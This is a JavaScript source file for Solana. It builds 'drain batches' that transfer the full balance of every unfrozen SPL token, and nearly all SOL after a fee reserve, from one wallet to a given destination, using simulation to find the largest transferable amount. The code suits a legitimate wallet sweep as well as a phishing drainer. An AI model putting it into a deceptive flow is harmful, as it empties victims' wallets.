import {
  PublicKey,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
} from "@solana/web3.js";
import { getWorkingConnection } from "./solana";

async function loadSplTokenLib() {
  return import("@solana/spl-token");
}

async function buildSplTransferInstructions(asset, from, to) {
  if (!asset.mint || !asset.tokenAccount || !asset.programId) {
    throw new Error(`Token inválido: ${asset.symbol}`);
  }

  if (asset.frozen) {
    throw new Error(`Token congelado: ${asset.symbol}`);
  }

  const {
    createAssociatedTokenAccountInstruction,
    createTransferInstruction,
    getAccount,
    getAssociatedTokenAddress,
  } = await loadSplTokenLib();

  const connection = await getWorkingConnection();
  const mint = new PublicKey(asset.mint);
  const programId = new PublicKey(asset.programId);
  const sourceTokenAccount = new PublicKey(asset.tokenAccount);
  const destinationTokenAccount = await getAssociatedTokenAddress(
    mint,
    to,
    false,
    programId
  );

  const sourceAccount = await getAccount(
    connection,
    sourceTokenAccount,
    undefined,
    programId
  );

  if (sourceAccount.amount === 0n) {
    throw new Error(`Token ya transferido: ${asset.symbol}`);
  }

  const instructions = [];

  try {
    await getAccount(connection, destinationTokenAccount, undefined, programId);
  } catch {
    instructions.push(
      createAssociatedTokenAccountInstruction(
        from,
        destinationTokenAccount,
        to,
        mint,
        programId
      )
    );
  }

  instructions.push(
    createTransferInstruction(
      sourceTokenAccount,
      destinationTokenAccount,
      from,
      sourceAccount.amount,
      [],
      programId
    )
  );

  return {
    instructions,
    label: asset.symbol,
  };
}

async function buildSolTransferInstruction(from, to) {
  const connection = await getWorkingConnection();
  const balance = await connection.getBalance(from);
  const feeReserveLamports = 50_000_000;

  if (balance <= feeReserveLamports) return null;

  const { blockhash } = await connection.getLatestBlockhash("confirmed");
  const probeMessage = new TransactionMessage({
    payerKey: from,
    recentBlockhash: blockhash,
    instructions: [
      SystemProgram.transfer({
        fromPubkey: from,
        toPubkey: to,
        lamports: 1,
      }),
    ],
  }).compileToV0Message();

  const feeResult = await connection.getFeeForMessage(probeMessage);
  const baseFee = feeResult?.value ?? 5_000;

  let transferLamports = balance - feeReserveLamports;

  // If the current network fee is unexpectedly higher than the reserve, stop here.
  if (transferLamports <= baseFee) {
    return null;
  }

  while (transferLamports > 0) {
    const instruction = SystemProgram.transfer({
      fromPubkey: from,
      toPubkey: to,
      lamports: transferLamports,
    });
    const transaction = await compileTransaction(from, [instruction]);
    const simulation = await connection.simulateTransaction(transaction, {
      sigVerify: false,
      replaceRecentBlockhash: true,
    });

    if (!simulation.value.err) {
      return instruction;
    }

    transferLamports -= 10_000;
  }

  return null;
}

async function compileTransaction(payer, instructions) {
  const connection = await getWorkingConnection();
  const { blockhash } = await connection.getLatestBlockhash("confirmed");

  return new VersionedTransaction(
    new TransactionMessage({
      payerKey: payer,
      recentBlockhash: blockhash,
      instructions,
    }).compileToV0Message()
  );
}

export async function buildDrainBatches(fromAddress, destinationAddress, assets) {
  const from = new PublicKey(fromAddress);
  const to = new PublicKey(destinationAddress);
  const splAssets = assets.filter(
    (asset) => asset.type === "spl" && !asset.frozen
  );
  const includeSol = assets.some(
    (asset) => asset.id === "sol" || asset.type === "SOL" || asset.label === "SOL"
  );

  const batches = [];

  for (const asset of splAssets) {
    batches.push({
      label: asset.symbol,
      build: async () => {
        const { instructions } = await buildSplTransferInstructions(
          asset,
          from,
          to
        );
        return compileTransaction(from, instructions);
      },
    });
  }

  if (includeSol) {
    batches.push({
      label: "SOL",
      build: async () => {
        const solInstruction = await buildSolTransferInstruction(from, to);
        if (!solInstruction) {
          throw new Error("insufficient_rent");
        }
        return compileTransaction(from, [solInstruction]);
      },
    });
  }

  return batches;
}
